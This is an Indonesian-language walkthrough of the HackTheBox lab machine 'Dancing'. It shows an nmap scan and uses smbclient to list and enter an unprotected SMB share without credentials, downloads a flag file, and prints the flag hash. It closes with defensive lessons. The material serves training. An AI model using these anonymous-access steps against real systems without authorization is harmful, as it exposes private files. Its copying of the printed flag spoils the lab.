# Dancing — SMB Anonymous Access

**Date:** 2026-04-29
**Platform:** HackTheBox (Starting Point)
**Difficulty:** Very Easy
**Category:** Network / Windows

---

## Target

Mesin Windows bernama **Dancing** dari HTB Starting Point. Target menjalankan layanan SMB (Server Message Block) di port 445 yang dikonfigurasi secara tidak aman — salah satu share-nya bisa diakses tanpa autentikasi apapun.

---

## Vulnerability

**SMB Share Misconfiguration — Anonymous Access**

Share bernama `WorkShares` tidak diproteksi dengan password, sehingga siapapun yang terhubung ke jaringan bisa mengaksesnya tanpa kredensial. Di dalamnya terdapat file milik user yang seharusnya bersifat privat.

Penyebab: administrator membuat share tanpa mengaktifkan access control, sehingga izin akses dibiarkan terbuka untuk semua orang (anonymous/guest).

---

## Tools Used

- **Nmap** — port scanning & service enumeration
- **smbclient** — mengakses SMB share dari Linux

---

## Exploitation Steps

### Step 1 — Verifikasi Koneksi ke Target

Pastikan target hidup dan koneksi VPN HTB berjalan normal.

```bash
ping -c 4 10.129.7.35
```

Output yang diharapkan: ada balasan (reply) dari target dengan latency normal.

> Catatan: di Linux, ping berjalan selamanya tanpa flag `-c`. Gunakan `-c [angka]` agar berhenti otomatis setelah sejumlah paket.

---

### Step 2 — Port Scanning dengan Nmap

```bash
nmap -sV -sC 10.129.7.35
```

**Penjelasan flag:**
| Flag | Fungsi |
|------|--------|
| `-sV` | Deteksi versi service di setiap port |
| `-sC` | Jalankan default scripts untuk info tambahan |

**Hasil scan:**

```
PORT     STATE  SERVICE       VERSION
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  (SMB)
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**Temuan penting:**
- Port **445** terbuka dengan service `microsoft-ds` (nama resmi SMB over TCP)
- `Message signing enabled but not required` — SMB bisa diakses tanpa verifikasi identitas pengirim

---

### Step 3 — Enumerasi SMB Shares

List semua share yang tersedia di target tanpa menggunakan password.

```bash
smbclient -L 10.129.7.35 -N
```

**Penjelasan flag:**
| Flag | Fungsi |
|------|--------|
| `-L` | List (tampilkan semua share yang ada) |
| `-N` | No password (anonymous login) |

**Hasil:**

```
Sharename    Type    Comment
---------    ----    -------
ADMIN$       Disk    Remote Admin
C$           Disk    Default share
IPC$         IPC     Remote IPC
WorkShares   Disk
```

**Analisis:**
- `ADMIN$`, `C$`, `IPC$` — share sistem default Windows, biasanya memerlukan kredensial admin
- `WorkShares` — share tanpa keterangan dan tanpa tanda `$`, kemungkinan besar bisa diakses secara anonim

> Error `Unable to connect with SMB1` yang muncul di bawah output bisa diabaikan — ini hanya berarti SMB versi lama tidak tersedia, bukan masalah pada proses enumerasi.

---

### Step 4 — Akses ke Share WorkShares

```bash
smbclient \\\\10.129.7.35\\WorkShares -N
```

**Kenapa menggunakan empat backslash?**

Linux menginterpretasikan `\\` sebagai satu karakter `\`. Agar SMB menerima format `\\IP\ShareName`, kita harus menuliskan `\\\\IP\\ShareName` di terminal Linux.

Setelah berhasil masuk, prompt berubah menjadi `smb: \>`

```
smb: \> ls

  .        D    0   Mon Mar 29 04:22:01 2021
  ..       D    0   Mon Mar 29 04:22:01 2021
  Amy.J    D    0   Mon Mar 29 05:08:24 2021
  James.P  D    0   Thu Jun  3 04:38:03 2021
```

Terdapat dua folder milik dua user berbeda. Lakukan eksplorasi ke masing-masing folder.

---

### Step 5 — Menemukan dan Mengambil Flag

Eksplorasi folder `James.P`:

```bash
smb: \> cd James.P
smb: \James.P\> ls
```

Ditemukan `flag.txt`. Download file tersebut:

```bash
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

Baca isi file di terminal lokal:

```bash
cat flag.txt
```

---

## Proof

```
Flag: 5f61c10dffbc77a704d76016a22f1664
```

---

## Bonus Finding

Di folder `Amy.J` ditemukan file `worknotes.txt` berisi catatan internal administrator:

```
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

File ini seharusnya tidak berada di share yang bisa diakses publik. Bocornya catatan internal seperti ini bisa memberikan informasi berharga tentang infrastruktur dan rencana teknis tim IT kepada pihak yang tidak berwenang.

---

## Lessons Learned

- SMB share yang tidak diproteksi password adalah celah umum di lingkungan Windows — selalu terapkan access control pada setiap share
- Share tanpa tanda `$` di akhir nama bukan berarti aman — justru share seperti ini lebih mudah diakses secara anonim
- File sensitif seperti catatan kerja, konfigurasi, atau dokumen internal tidak boleh disimpan di shared folder yang aksesnya tidak dikontrol
- `nmap -sV -sC` adalah kombinasi dasar yang sangat berguna untuk mendapatkan gambaran awal sebuah target
- Perbedaan perilaku `ping` antara Linux (jalan terus) dan Windows (berhenti sendiri) penting untuk diingat saat bekerja di Kali Linux